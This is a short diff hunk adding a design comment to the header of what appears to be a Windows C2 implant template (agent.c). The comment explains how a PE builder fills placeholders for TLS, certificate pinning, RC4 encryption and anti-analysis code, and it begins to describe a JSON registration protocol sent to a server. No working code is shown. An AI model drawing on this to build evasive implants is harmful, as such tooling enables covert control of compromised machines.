@@ -7,6 +7,18 @@
  * Compile:
  *   x86_64-w64-mingw32-gcc -o agent.exe agent.c -lws2_32
  *
+ * SINGLE SOURCE OF TRUTH. This one template carries every feature the PE
+ * builder can emit, gated by the four placeholders below: {{TLS}},
+ * {{TLS_FINGERPRINT}}, {{RC4KEY}}, {{ANTI_ANALYSIS}}. They are substituted
+ * into #defines inside the file (with #ifndef guards so a manual -D still
+ * wins), NOT passed as compiler flags — so a merge must keep all four gates
+ * and their code together in this file. Splitting the template into a
+ * "TLS" variant and a "RC4/anti-analysis" variant is what previously dropped
+ * {{RC4KEY}}/{{ANTI_ANALYSIS}} from the TLS build and broke test_pe_render.
+ * TLS and RC4 COMPOSE (they do not compete): TLS upgrades the socket first,
+ * then RC4 frames the JSON line inside it, exactly as the listener does
+ * (upgrade TLS, then _rc4_extract RC4-decrypts the TLS plaintext).
+ *
  * Protocol (newline-delimited JSON over TCP):
  *   Agent -> Server:
  *     {"type":"register","auth":"...","hostname":"...","os":"windows",
